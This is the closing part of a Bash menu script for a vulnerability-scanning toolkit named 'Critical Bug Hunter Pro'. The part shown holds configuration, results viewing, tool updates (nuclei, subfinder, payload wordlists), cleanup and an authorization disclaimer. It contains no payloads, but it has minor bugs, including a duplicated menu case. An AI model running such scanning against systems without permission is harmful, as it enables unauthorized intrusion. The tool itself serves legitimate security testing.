    if [[ "$view_results" =~ ^[Yy]$ ]]; then
        if [ -d "$OUTPUT_DIR" ]; then
            find "$OUTPUT_DIR" -name "*.txt" -type f | while read -r file; do
                if [ -s "$file" ]; then
                    echo -e "\n${CYAN}=== $(basename "$file") ===${NC}"
                    head -20 "$file"
                fi
            done
        fi
    fi
}

# ============================================
# OPTION 6: LIVE MONITORING MODE
# ============================================

live_monitoring() {
    echo -e "${PURPLE}[*] Live Monitoring Mode${NC}"
    echo ""
    read -p "Enter domain to monitor: " monitor_domain
    if [ -z "$monitor_domain" ]; then
        echo -e "${RED}[!] Domain required${NC}"
        return
    fi
    echo -e "${YELLOW}[*] Monitoring $monitor_domain${NC}"
    echo -e "${CYAN}[*] Press Ctrl+C to stop${NC}"
    local count=1
    while true; do
        echo -e "\n[$(date '+%H:%M:%S')] Check #$count"
        if ping -c 1 -W 2 "$monitor_domain" &>/dev/null 2>&1; then
            echo -e "  ${GREEN}✓ Online${NC}"
        else
            echo -e "  ${RED}✗ Offline${NC}"
        fi
        ((count++))
        sleep 30
    done
}

# ============================================
# OPTION 7: TOOLS CONFIGURATION
# ============================================

configure_tools() {
    echo -e "${CYAN}[*] Tools Configuration${NC}"
    echo ""
    echo "1. View current configuration"
    echo "2. Set default target"
    echo "3. Set scan threads"
    echo "4. Set request timeout"
    echo "5. Set scan depth"
    echo "6. Set user agent"
    echo "7. Set API keys"
    echo "0. Back to main menu"
    echo ""
    
    read -p "Choice [0-7]: " config_choice
    
    case $config_choice in
        1)
            echo -e "${YELLOW}[*] Current configuration:${NC}"
            echo "========================================"
            if [ -f "$CONFIG_DIR/config.cfg" ]; then
                cat "$CONFIG_DIR/config.cfg"
            else
                echo "TARGET=\"\""
                echo "THREADS=10"
                echo "TIMEOUT=30"
                echo "SCAN_DEPTH=3"
                echo "USER_AGENT=\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\""
                echo "API_KEYS=\"\""
                echo "PROXY=\"\""
                echo "COLLABORATOR=\"\""
                echo "RATE_LIMIT=100"
                echo "MAX_SUBDOMAINS=5000"
                echo "MAX_URLS=10000"
            fi
            echo "========================================"
            ;;
            
        2)
            read -p "Enter default target (domain or URL): " default_target
            if [ -z "$default_target" ]; then
                echo -e "${RED}[!] Target cannot be empty${NC}"
            else
                # Update config file
                if [ -f "$CONFIG_DIR/config.cfg" ]; then
                    grep -v "^TARGET=" "$CONFIG_DIR/config.cfg" > "$CONFIG_DIR/config.tmp"
                    mv "$CONFIG_DIR/config.tmp" "$CONFIG_DIR/config.cfg"
                fi
                echo "TARGET=\"$default_target\"" >> "$CONFIG_DIR/config.cfg"
                echo -e "${GREEN}[√] Default target saved: $default_target${NC}"
            fi
            ;;
            
        3)
            read -p "Enter number of threads (default 10): " threads
            if [[ "$threads" =~ ^[0-9]+$ ]] && [ "$threads" -gt 0 ] && [ "$threads" -le 100 ]; then
                if [ -f "$CONFIG_DIR/config.cfg" ]; then
                    grep -v "^THREADS=" "$CONFIG_DIR/config.cfg" > "$CONFIG_DIR/config.tmp"
                    mv "$CONFIG_DIR/config.tmp" "$CONFIG_DIR/config.cfg"
                fi
                echo "THREADS=$threads" >> "$CONFIG_DIR/config.cfg"
                echo -e "${GREEN}[√] Threads set to: $threads${NC}"
            else
                echo -e "${RED}[!] Invalid thread count (1-100)${NC}"
            fi
            ;;
            
        4)
            read -p "Enter timeout in seconds (default 30): " timeout
            if [[ "$timeout" =~ ^[0-9]+$ ]] && [ "$timeout" -gt 0 ] && [ "$timeout" -le 300 ]; then
                if [ -f "$CONFIG_DIR/config.cfg" ]; then
                    grep -v "^TIMEOUT=" "$CONFIG_DIR/config.cfg" > "$CONFIG_DIR/config.tmp"
                    mv "$CONFIG_DIR/config.tmp" "$CONFIG_DIR/config.cfg"
                fi
                echo "TIMEOUT=$timeout" >> "$CONFIG_DIR/config.cfg"
                echo -e "${GREEN}[√] Timeout set to: ${timeout}s${NC}"
            else
                echo -e "${RED}[!] Invalid timeout (1-300 seconds)${NC}"
            fi
            ;;
            
        5)
            read -p "Enter scan depth (1=Quick, 2=Normal, 3=Deep): " depth
            if [[ "$depth" =~ ^[1-3]$ ]]; then
                if [ -f "$CONFIG_DIR/config.cfg" ]; then
                    grep -v "^SCAN_DEPTH=" "$CONFIG_DIR/config.cfg" > "$CONFIG_DIR/config.tmp"
                    mv "$CONFIG_DIR/config.tmp" "$CONFIG_DIR/config.cfg"
                fi
                echo "SCAN_DEPTH=$depth" >> "$CONFIG_DIR/config.cfg"
                echo -e "${GREEN}[√] Scan depth set to: $depth${NC}"
            else
                echo -e "${RED}[!] Invalid depth (1-3)${NC}"
            fi
            ;;
            
        6)
            echo -e "${YELLOW}[*] Current user agent:${NC}"
            echo "USER_AGENT=\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\""
            echo ""
            echo "1. Use default (Chrome on Linux)"
            echo "2. Use mobile user agent"
            echo "3. Enter custom user agent"
            read -p "Choice: " ua_choice
            
            case $ua_choice in
                1)
                    ua="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
                    ;;
                2)
                    ua="Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
                    ;;
                3)
                    read -p "Enter custom user agent: " ua
                    ;;
                *)
                    echo -e "${RED}[!] Invalid choice${NC}"
                    return
                    ;;
            esac
            
            if [ ! -z "$ua" ]; then
                if [ -f "$CONFIG_DIR/config.cfg" ]; then
                    grep -v "^USER_AGENT=" "$CONFIG_DIR/config.cfg" > "$CONFIG_DIR/config.tmp"
                    mv "$CONFIG_DIR/config.tmp" "$CONFIG_DIR/config.cfg"
                fi
                echo "USER_AGENT=\"$ua\"" >> "$CONFIG_DIR/config.cfg"
                echo -e "${GREEN}[√] User agent updated${NC}"
            fi
            ;;
            
        7)
            echo -e "${YELLOW}[*] API Keys Configuration${NC}"
            echo ""
            echo "Available API services:"
            echo "1. GitHub Token (for github-subdomains)"
            echo "2. Shodan API Key"
            echo "3. VirusTotal API Key"
            echo "4. View current API keys"
            echo "0. Back"
            echo ""
            
            read -p "Choice: " api_choice
            
            case $api_choice in
                1)
                    read -p "Enter GitHub Token: " github_token
                    if [ ! -z "$github_token" ]; then
                        echo "GITHUB_TOKEN=\"$github_token\"" > "$CONFIG_DIR/api_keys.env"
                        echo -e "${GREEN}[√] GitHub Token saved${NC}"
                    fi
                    ;;
                4)
                    if [ -f "$CONFIG_DIR/api_keys.env" ]; then
                        echo -e "${YELLOW}[*] Current API keys:${NC}"
                        sed 's/=.*/=***/' "$CONFIG_DIR/api_keys.env"
                    else
                        echo -e "${YELLOW}[!] No API keys configured${NC}"
                    fi
                    ;;
                0) return ;;
                *) echo -e "${RED}[!] Invalid choice${NC}" ;;
            esac
            ;;
            
        0)
            return
            ;;
            
        *)
            echo -e "${RED}[!] Invalid choice${NC}"
            ;;
    esac
    
    echo ""
    read -p "Press Enter to continue..."
}

# ============================================
# OPTION 8: VIEW PREVIOUS RESULTS
# ============================================

view_results() {
    echo -e "${CYAN}[*] Previous Scan Results${NC}"
    echo ""
    
    # Check if results directory exists
    if [ ! -d "$RESULTS_DIR" ]; then
        echo -e "${YELLOW}[!] No results directory found${NC}"
        echo -e "${CYAN}[*] Run a scan first to generate results${NC}"
        return 1
    fi
    
    # Get list of scan directories
    local scan_dirs=()
    while IFS= read -r -d $'\0' dir; do
        scan_dirs+=("$dir")
    done < <(find "$RESULTS_DIR" -maxdepth 1 -type d -name "*scan*" -o -name "*report*" -print0 2>/dev/null)
    
    if [ ${#scan_dirs[@]} -eq 0 ]; then
        echo -e "${YELLOW}[!] No previous scan results found${NC}"
        echo -e "${CYAN}[*] Try running:${NC}"
        echo "  1. Option 2 - Full Professional Vulnerability Scan"
        echo "  2. Option 3 - Targeted Vulnerability Scan"
        echo "  3. Option 5 - Generate Professional Report"
        return 1
    fi
    
    # Display available scans
    echo -e "${GREEN}Available scans:${NC}"
    echo "========================================"
    for i in "${!scan_dirs[@]}"; do
        local dir_name=$(basename "${scan_dirs[$i]}")
        local dir_date=$(stat -c %y "${scan_dirs[$i]}" 2>/dev/null | cut -d' ' -f1 || echo "unknown")
        echo "$((i+1)). $dir_name (Created: $dir_date)"
    done
    echo "========================================"
    echo ""
    
    # Let user select a scan
    read -p "Enter scan number to view (0 to go back): " scan_num
    
    if [ "$scan_num" = "0" ] || [ -z "$scan_num" ]; then
        return
    fi
    
    # Validate input
    if ! [[ "$scan_num" =~ ^[0-9]+$ ]] || [ "$scan_num" -lt 1 ] || [ "$scan_num" -gt ${#scan_dirs[@]} ]; then
        echo -e "${RED}[!] Invalid selection${NC}"
        return 1
    fi
    
    local selected_dir="${scan_dirs[$((scan_num-1))]}"
    local selected_name=$(basename "$selected_dir")
    
    echo -e "\n${YELLOW}[*] Viewing: $selected_name${NC}"
    echo "========================================"
    
    # Show directory contents
    if [ -d "$selected_dir" ]; then
        # Count files by type
        local html_count=$(find "$selected_dir" -name "*.html" -type f | wc -l)
        local txt_count=$(find "$selected_dir" -name "*.txt" -type f | wc -l)
        local json_count=$(find "$selected_dir" -name "*.json" -type f | wc -l)
        local md_count=$(find "$selected_dir" -name "*.md" -type f | wc -l)
        
        echo -e "📁 Directory: $selected_dir"
        echo -e "📊 Files: $html_count HTML, $txt_count TXT, $json_count JSON, $md_count MD"
        echo ""
        
        # List important files
        echo -e "${GREEN}Key files found:${NC}"
        find "$selected_dir" -type f \( -name "*REPORT*" -o -name "*SUMMARY*" -o -name "scan.log" -o -name "findings*" \) 2>/dev/null | \
            while read -r file; do
                local size=$(du -h "$file" 2>/dev/null | cut -f1 || echo "?")
                echo "  • $(basename "$file") ($size)"
            done
        
        echo ""
        
        # Options for this scan
        echo "What would you like to do?"
        echo "1. List all files"
        echo "2. View scan summary"
        echo "3. View findings"
        echo "4. View log file"
        echo "5. Open in file manager"
        echo "0. Back to list"
        echo ""
        
        read -p "Choice: " action_choice
        
        case $action_choice in
            1)
                echo -e "\n${CYAN}[*] All files in scan:${NC}"
                find "$selected_dir" -type f 2>/dev/null | while read -r file; do
                    local size=$(du -h "$file" 2>/dev/null | cut -f1 || echo "?")
                    echo "  📄 $(basename "$file") ($size)"
                done
                ;;
                
            2)
                # Try to find and show summary file
                local summary_file=$(find "$selected_dir" -name "*SUMMARY*" -o -name "*REPORT*" -type f | head -1)
                if [ -f "$summary_file" ]; then
                    echo -e "\n${CYAN}[*] Summary file content:${NC}"
                    head -50 "$summary_file"
                else
                    echo -e "${YELLOW}[!] No summary file found${NC}"
                fi
                ;;
                
            3)
                # Try to find findings
                local findings_file=$(find "$selected_dir" -name "*findings*" -o -name "*critical*" -o -name "*vuln*" -type f | head -1)
                if [ -f "$findings_file" ]; then
                    echo -e "\n${CYAN}[*] Findings file content:${NC}"
                    if [[ "$findings_file" == *.json ]]; then
                        head -30 "$findings_file"
                    else
                        head -30 "$findings_file"
                    fi
                else
                    echo -e "${YELLOW}[!] No findings file found${NC}"
                fi
                ;;
                
            4)
                # Show log file
                local log_file="$selected_dir/scan.log"
                if [ -f "$log_file" ]; then
                    echo -e "\n${CYAN}[*] Log file (last 20 lines):${NC}"
                    tail -20 "$log_file"
                else
                    echo -e "${YELLOW}[!] No log file found${NC}"
                fi
                ;;
                
            5)
                echo -e "\n${CYAN}[*] Scan directory:${NC}"
                echo "$selected_dir"
                echo -e "\n${YELLOW}[*] You can browse this directory manually${NC}"
                ;;
                
            0)
                # Go back to list
                view_results
                return
                ;;
                
            *)
                echo -e "${RED}[!] Invalid choice${NC}"
                ;;
        esac
        
    else
        echo -e "${RED}[!] Selected directory not found${NC}"
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

# ============================================
# OPTION 9: UPDATE ALL TOOLS
# ============================================

update_all_tools() {
    echo -e "${PURPLE}[*] Updating All Tools${NC}"
    echo ""
    
    echo "Select update method:"
    echo "1. Update via Nix channels"
    echo "2. Update Go tools"
    echo "3. Update Python packages"
    echo "4. Update Nuclei templates"
    echo "5. Update wordlists"
    echo "6. Update everything"
    echo "0. Back to main menu"
    echo ""
    
    read -p "Choice [0-6]: " update_choice
    
    case $update_choice in
        1)
            echo -e "${BLUE}[+] Updating Nix channels...${NC}"
            nix-channel --update 2>/dev/null && \
                echo -e "${GREEN}[√] Nix channels updated${NC}" || \
                echo -e "${YELLOW}[!] Failed to update Nix channels${NC}"
            ;;
            
        2)
            echo -e "${BLUE}[+] Updating Go tools...${NC}"
            if command -v go &> /dev/null; then
                # List of Go tools to update
                local go_tools=(
                    "github.com/projectdiscovery/nuclei/v2/cmd/nuclei"
                    "github.com/projectdiscovery/subfinder/v2/cmd/subfinder"
                    "github.com/projectdiscovery/httpx/cmd/httpx"
                    "github.com/projectdiscovery/naabu/v2/cmd/naabu"
                    "github.com/projectdiscovery/dnsx/cmd/dnsx"
                    "github.com/ffuf/ffuf"
                    "github.com/lc/gau/v2/cmd/gau"
                    "github.com/tomnomnom/waybackurls"
                )
                
                for tool in "${go_tools[@]}"; do
                    echo -n "  → $(basename "$tool"): "
                    go install "$tool@latest" 2>/dev/null && \
                        echo -e "${GREEN}✓${NC}" || \
                        echo -e "${RED}✗${NC}"
                done
                echo -e "${GREEN}[√] Go tools update attempted${NC}"
            else
                echo -e "${YELLOW}[!] Go not installed. Use Option 1 first.${NC}"
            fi
            ;;
            
        3)
            echo -e "${BLUE}[+] Updating Python packages...${NC}"
            if command -v pip3 &> /dev/null; then
                pip3 install --upgrade pip 2>/dev/null
                
                local py_packages=(
                    "requests"
                    "beautifulsoup4"
                    "lxml"
                    "selenium"
                    "pycryptodome"
                    "cryptography"
                    "paramiko"
                    "urllib3"
                )
                
                for pkg in "${py_packages[@]}"; do
                    echo -n "  → $pkg: "
                    pip3 install --upgrade "$pkg" 2>/dev/null && \
                        echo -e "${GREEN}✓${NC}" || \
                        echo -e "${RED}✗${NC}"
                done
                echo -e "${GREEN}[√] Python packages update attempted${NC}"
            else
                echo -e "${YELLOW}[!] Python/pip not installed${NC}"
            fi
            ;;
            
        4)
            echo -e "${BLUE}[+] Updating Nuclei templates...${NC}"
            if command -v nuclei &> /dev/null; then
                nuclei -update-templates 2>/dev/null && \
                    echo -e "${GREEN}[√] Nuclei templates updated${NC}" || \
                    echo -e "${YELLOW}[!] Failed to update Nuclei templates${NC}"
            else
                echo -e "${YELLOW}[!] Nuclei not installed. Use Option 1 first.${NC}"
            fi
            ;;
            
        5)
            echo -e "${BLUE}[+] Updating wordlists...${NC}"
            echo -e "${YELLOW}[*] This may take a while...${NC}"
            
            # Update wordlists if directories exist
            if [ -d "$WORDLISTS_DIR/SecLists" ]; then
                echo -n "  → SecLists: "
                cd "$WORDLISTS_DIR/SecLists" && \
                    git pull 2>/dev/null && \
                    echo -e "${GREEN}✓${NC}" || \
                    echo -e "${RED}✗${NC}"
            fi
            
            if [ -d "$WORDLISTS_DIR/PayloadsAllTheThings" ]; then
                echo -n "  → PayloadsAllTheThings: "
                cd "$WORDLISTS_DIR/PayloadsAllTheThings" && \
                    git pull 2>/dev/null && \
                    echo -e "${GREEN}✓${NC}" || \
                    echo -e "${RED}✗${NC}"
            fi
            
            echo -e "${GREEN}[√] Wordlists update attempted${NC}"
            ;;
            
        6)
            echo -e "${PURPLE}[*] Updating everything...${NC}"
            echo -e "${YELLOW}[*] This may take several minutes${NC}"
            
            # Update Nix
            echo -e "${BLUE}[1/5] Updating Nix...${NC}"
            nix-channel --update 2>/dev/null
            
            # Update Go tools
            echo -e "${BLUE}[2/5] Updating Go tools...${NC}"
            if command -v go &> /dev/null; then
                go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest 2>/dev/null
                go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 2>/dev/null
            fi
            
            # Update Python
            echo -e "${BLUE}[3/5] Updating Python packages...${NC}"
            if command -v pip3 &> /dev/null; then
                pip3 install --upgrade pip requests beautifulsoup4 2>/dev/null
            fi
            
            # Update Nuclei
            echo -e "${BLUE}[4/5] Updating Nuclei templates...${NC}"
            if command -v nuclei &> /dev/null; then
                nuclei -update-templates 2>/dev/null
            fi
            
            # Update wordlists
            echo -e "${BLUE}[5/5] Checking wordlists...${NC}"
            
            echo -e "${GREEN}[√] Full update process completed${NC}"
            echo -e "${YELLOW}[!] Some updates may require restarting the tool${NC}"
            ;;
            
        0)
            return
            ;;
            
        *)
            echo -e "${RED}[!] Invalid choice${NC}"
            ;;
    esac
    
    echo ""
    read -p "Press Enter to continue..."
}

# ============================================
# OPTION 11: DATABASE MANAGEMENT
# ============================================

manage_database() {
    echo -e "${CYAN}[*] Database Management${NC}"
    echo ""
    echo "1. View statistics"
    echo "2. Export data"
    echo "3. Clear database"
    echo "0. Back"
    echo ""
    read -p "Choice: " db_choice
    case $db_choice in
        1) get_statistics ;;
        2)
            if [ -f "$DB_FILE" ]; then
                local export_file="$CONFIG_DIR/findings_$(date +%Y%m%d).csv"
                sqlite3 -csv "$DB_FILE" "SELECT * FROM findings;" > "$export_file" 2>/dev/null
                echo -e "${GREEN}[√] Exported to: $export_file${NC}"
            else
                echo -e "${YELLOW}[!] No database found${NC}"
            fi
            ;;
        3)
            read -p "Clear database? (y/n): " confirm
            if [[ "$confirm" =~ ^[Yy]$ ]]; then
                rm -f "$DB_FILE"
                echo -e "${GREEN}[√] Database cleared${NC}"
            fi
            ;;
        0) return ;;
        *) echo -e "${RED}[!] Invalid choice${NC}" ;;
    esac
}

# ============================================
# MAIN MENU ENHANCED untuk Nix on Droid
# ============================================

show_pro_banner() {
    # Check if clear command exists
    if command -v clear &> /dev/null; then
        clear
    else
        # Alternative: print 50 newlines
        printf '\n%.0s' {1..50}
    fi
    echo -e "${RED}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════╗
║    ██████╗██████╗ ██╗████████╗██╗ ██████╗ █████╗ ██╗        ║
║   ██╔════╝██╔══██╗██║╚══██╔══╝██║██╔════╝██╔══██╗██║        ║
║   ██║     ██████╔╝██║   ██║   ██║██║     ███████║██║        ║
║   ██║     ██╔══██╗██║   ██║   ██║██║     ██╔══██║██║        ║
║   ╚██████╗██║  ██║██║   ██║   ██║╚██████╗██║  ██║███████╗   ║
║    ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ║
║                                                              ║
║         ██████╗ ██╗   ██╗ ██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗║
║         ██╔══██╗██║   ██║██╔════╝ ██║  ██║██║   ██║████╗  ██║║
║         ██████╔╝██║   ██║██║  ███╗███████║██║   ██║██╔██╗ ██║║
║         ██╔══██╗██║   ██║██║   ██║██╔══██║██║   ██║██║╚██╗██║║
║         ██████╔╝╚██████╔╝╚██████╔╝██║  ██║╚██████╔╝██║ ╚████║║
║         ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝║
║                   ULTIMATE EDITION v4.0                       ║
║                   NIX ON DROID EDITION                        ║
╚══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"

    # Show system info untuk Nix on Droid
    echo -e "${CYAN}System: $(uname -o) | CPU: $(nproc) cores | RAM: $(free -m 2>/dev/null | awk 'NR==2{print $2}' 2>/dev/null || echo "?")MB${NC}"
    echo -e "${YELLOW}Date: $(date)${NC}"
    echo -e "${RED}⚠️  Authorized Testing Only! ⚠️${NC}"
    echo ""
}

main_pro_menu() {
    # Initialize
    init_setup
    init_database
    load_plugins

    while true; do
        show_pro_banner

        echo -e "${WHITE}Select an option:${NC}"
        echo -e "${GREEN}1. 🛠️  Install/Update Professional Tools${NC}"
        echo -e "${GREEN}2. 🔍 Full Professional Vulnerability Scan${NC}"
        echo -e "${CYAN}3. 🎯 Targeted Vulnerability Scan${NC}"
        echo -e "${CYAN}4. 🌐 API Security Assessment${NC}"
        echo -e "${BLUE}5. 📊 Generate Professional Report${NC}"
        echo -e "${PURPLE}6. 👁️  Live Monitoring Mode${NC}"
        echo -e "${PURPLE}7. ⚙️  Tools Configuration${NC}"
        echo -e "${YELLOW}8. 📁 View Previous Results${NC}"
        echo -e "${YELLOW}9. 🔄 Update All Tools${NC}"
        echo -e "${BLUE}10. 📈 View Statistics${NC}"
        echo -e "${CYAN}11. 🗃️  Database Management${NC}"
        echo -e "${RED}0. 🚪 Exit${NC}"
        echo ""

        read -p "Choice [0-11]: " choice

                case $choice in
            1) install_pro_tools ;;
            2) pro_scan ;;
            3) targeted_scan_menu ;;
            4) 
                echo -e "${PURPLE}[*] API Security Assessment${NC}"
                read -p "Enter API endpoint: " api_endpoint
                if [ -z "$api_endpoint" ]; then
                    echo -e "${RED}[!] API endpoint required${NC}"
                else
                    echo -e "${BLUE}[+] Testing: $api_endpoint${NC}"
                    test_api_auth "$api_endpoint"
                    test_api_misconfig "$api_endpoint"
                    echo -e "${GREEN}[√] Basic API tests completed${NC}"
                fi
                ;;
            5) generate_pro_report ;;
            # ... sisanya
	    5) generate_pro_report ;;
            6) live_monitoring ;;
            7) configure_tools ;;
            8) view_results ;;
            9) update_all_tools ;;
            10) get_statistics ;;
            11) manage_database ;;
            0)
                echo -e "${GREEN}[√] Exiting Critical Bug Hunter Pro${NC}"
                cleanup
                exit 0
                ;;
            *) echo -e "${RED}[!] Invalid choice${NC}" ;;
        esac

        echo ""
        echo -e "${YELLOW}Press Enter to continue...${NC}"
        read
    done
}

# ============================================
# CLEANUP FUNCTIONS
# ============================================

cleanup() {
    echo -e "${CYAN}[*] Cleaning up...${NC}"

    # Kill background processes
    pkill -f interactsh-client 2>/dev/null || true
    pkill -f nuclei 2>/dev/null || true
    pkill -f gospider 2>/dev/null || true

    # Clean temp directory
    rm -rf "$TEMP_DIR" 2>/dev/null || true

    # Close file descriptors hanya jika terbuka
    if [ -e /proc/self/fd/3 ]; then
        exec 1>&3 2>&4
        exec 3>&- 4>&-
    fi

    # Log cleanup
    log_action "Cleanup completed" "INFO"

    echo -e "${GREEN}[√] Cleanup completed${NC}"
}

# ============================================
# SCRIPT START
# ============================================

# Initial disclaimer
echo -e "${RED}"
cat << "EOF"
════════════════════════════════════════════════════════════════════════════════
   ██████╗██████╗ ██╗████████╗██╗ ██████╗ █████╗ ██╗    ██████╗ ██╗   ██╗
  ██╔════╝██╔══██╗██║╚══██╔══╝██║██╔════╝██╔══██╗██║    ██╔══██╗██║   ██║
  ██║     ██████╔╝██║   ██║   ██║██║     ███████║██║    ██████╔╝██║   ██║
  ██║     ██╔══██╗██║   ██║   ██║██║     ██╔══██║██║    ██╔══██╗██║   ██║
  ╚██████╗██║  ██║██║   ██║   ██║╚██████╗██║  ██║██║    ██████╔╝╚██████╔╝
   ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝    ╚═════╝  ╚═════╝

                    CRITICAL BUG HUNTER PRO - ULTIMATE EDITION
                    For Authorized Security Testing Only!
════════════════════════════════════════════════════════════════════════════════
EOF
echo -e "${NC}"

# Legal disclaimer
echo -e "${YELLOW}[!] IMPORTANT LEGAL DISCLAIMER:${NC}"
echo "1. Use only on systems you OWN or have WRITTEN PERMISSION for"
echo "2. Unauthorized testing is ILLEGAL and punishable by law"
echo "3. You are solely responsible for your actions"
echo "4. This tool is for educational and authorized testing only"
echo ""
echo "By using this tool, you agree to:"
echo "- Use it only for legal purposes"
echo "- Not attack systems without permission"
echo "- Take full responsibility for your actions"
echo ""

read -p "Do you accept these terms? (yes/no): " accept_terms

if [ "$accept_terms" != "yes" ]; then
    echo -e "${RED}[!] Terms not accepted. Exiting.${NC}"
    exit 1
fi

# Ask for confirmation
read -p "Are you authorized to test the target system? (yes/no): " authorized

if [ "$authorized" != "yes" ]; then
    echo -e "${RED}[!] Unauthorized use prohibited. Exiting.${NC}"
    exit 1
fi

# Start main menu
main_pro_menu
